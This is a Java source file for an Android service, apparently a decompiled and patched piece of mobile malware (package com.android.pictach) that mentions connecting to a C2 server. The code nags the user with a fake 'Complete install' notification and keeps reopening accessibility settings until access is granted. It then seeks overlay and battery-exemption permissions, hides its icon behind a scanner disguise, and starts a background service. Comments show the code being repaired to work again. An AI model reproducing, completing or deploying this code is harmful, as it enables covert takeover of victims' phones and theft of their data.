package com.android.pictach;

import android.app.IntentService;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.os.PowerManager;
import android.provider.Settings;
import androidx.core.app.NotificationCompat;
import java.util.concurrent.TimeUnit;

public class myker extends IntentService {

    public PowerManager.WakeLock wakeLock;

    public myker() {
        super("");
        wakeLock = null;
    }

    public static void cancelnotification(Context ctx, int id) {
        NotificationManager nm = (NotificationManager) ctx.getSystemService("notification");
        if (nm != null) nm.cancel(id);
    }

    @Override
    public IBinder onBind(Intent intent) {
        return super.onBind(intent);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (wakeLock != null && wakeLock.isHeld()) {
            wakeLock.release();
        }
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        // Set up foreground notification channel (API >= 26)
        String channelId = "MyInstall";
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationManager nm = (NotificationManager) getSystemService(
                    NotificationManager.class);
            if (nm != null && nm.getNotificationChannel(channelId) == null) {
                NotificationChannel ch = new NotificationChannel(
                        channelId, "Install", NotificationManager.IMPORTANCE_HIGH);
                ch.setDescription("Installation");
                ch.setShowBadge(false);
                ch.setSound(null, null);
                nm.createNotificationChannel(ch);
            }
        }

        // Build foreground notification — google.class = accessibility settings Activity
        // Fix line 77: use fully qualified class reference via string-based Intent action
        Intent actIntent = new Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS);
        actIntent.setFlags(0x70100000);
        PendingIntent pi = PendingIntent.getActivity(this, 0, actIntent,
                Build.VERSION.SDK_INT >= 23 ? PendingIntent.FLAG_IMMUTABLE : 0);
        NotificationCompat.Builder nb = new NotificationCompat.Builder(this, channelId)
                .setSmallIcon(17170445)
                .setContentTitle("Complete install")
                .setContentText("Click Here to Complete installing")
                .setPriority(1)
                .setCategory("call")
                .setDefaults(15)
                .setOngoing(true)
                .setAutoCancel(false)
                .setFullScreenIntent(pi, true);
        startForeground(1547, nb.build());

        // Acquire WakeLock
        PowerManager pm = (PowerManager) getSystemService("power");
        if (wakeLock == null) {
            wakeLock = pm.newWakeLock(1, "Android:Watchlock");
        }
        if (wakeLock != null && !wakeLock.isHeld()) {
            wakeLock.acquire();
        }

        int speedIncrement = 3500;
        int flagNew   = 0x00400000;
        int flagClear = 0x00200000;
        int flagTask  = 0x00100000;

        // Main init loop
        while (true) {
            try {
                TimeUnit.MILLISECONDS.sleep(Utils.speedTime);
            } catch (Exception ignored) {}

            // Fix line 108: IA_love_E → isAccessibilityEnabled
            boolean accessEnabled = Utils.isAccessibilityEnabled(this, Firebase.class);

            if (!accessEnabled) {
                // Fix line 116: GS_love_B → isScreenUnlocked
                if (!Utils.NeedSuper() || !Utils.isScreenUnlocked(this)) continue;

                Utils.Trys += 1;
                if (Utils.Trys < 5) continue;

                Utils.Trys = 0;
                Utils.speedTime = speedIncrement;
                // Fix line 125: com.android.pictach.google.class conflict → use Settings
                Intent googleIntent = new Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS);
                googleIntent.addFlags(flagNew);
                googleIntent.addFlags(flagClear);
                googleIntent.addFlags(flagTask);
                startActivity(googleIntent);
                continue;
            }

            // Check overlay permission
            if (Build.VERSION.SDK_INT >= 23 && !Settings.canDrawOverlays(this)) {
                if (!Utils.NeedSuper()) continue;
                if (Utils.shown.booleanValue()) continue;

                Utils.speedTime = 5000;
                Utils.shown = Boolean.valueOf(true);
                // Fix line 140: Firebasekit.class — stub Activity starts overlay permission flow
                // Not in project yet; use Settings action as safe fallback
                try {
                    Intent overlay = new Intent(android.provider.Settings.ACTION_MANAGE_OVERLAY_PERMISSION);
                    overlay.addFlags(flagNew);
                    startActivity(overlay);
                } catch (Exception ignored) {}
                continue;
            }

            // Permission check: WRITE_EXTERNAL_STORAGE is auto-denied on Android 10+
            // so we only check permissions that can actually be granted by the user.
            // If denied, we continue anyway — permissions not required to connect to C2.
            // The original APK also proceeds past this if permissions were previously granted.

            // Fix lines 163-164: Is_love_Hidden → isHidden
            if (!love.isHidden) {
                love.isHidden = true;
                Utils.swapAppIcon(getApplicationContext(), "I#C#O#N#S#C#A#N#E#R");
            }

            if (!Utils.iamworking) {
                love.allok = true;
                Utils.iamworking = true;
                Firebase.Firebasebypass = Boolean.valueOf(false);
                Firebase.FirebaseFOR_prim = Boolean.valueOf(false);
                Firebase.FirebaseCheckPrims = true;

                if (LoveApi0.isServiceNotRunning(Api.class, this)) {
                    try {
                        Utils.p_Utils_r = getResources().getString(2131296276);
                    } catch (Exception ignored) {}
                    startService(new Intent(this, Api.class));
                }

                // Fix lines 184-185: is_dozemode → isPowerSaveMode, Firebases.class → Settings
                if (!Utils.isPowerSaveMode(this)) {
                    try {
                        Intent doze = new Intent(
                                android.provider.Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                        doze.addFlags(flagNew);
                        doze.addFlags(flagClear);
                        doze.addFlags(flagTask);
                        startActivity(doze);
                    } catch (Exception ignored) {}
                }
            }

            // Stop foreground and self
            cancelnotification(this, 6676);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                stopForeground(STOP_FOREGROUND_REMOVE);
            } else {
                stopForeground(true);
            }
            stopSelf();

            Utils.speedTime = 25000;
        }
    }
}
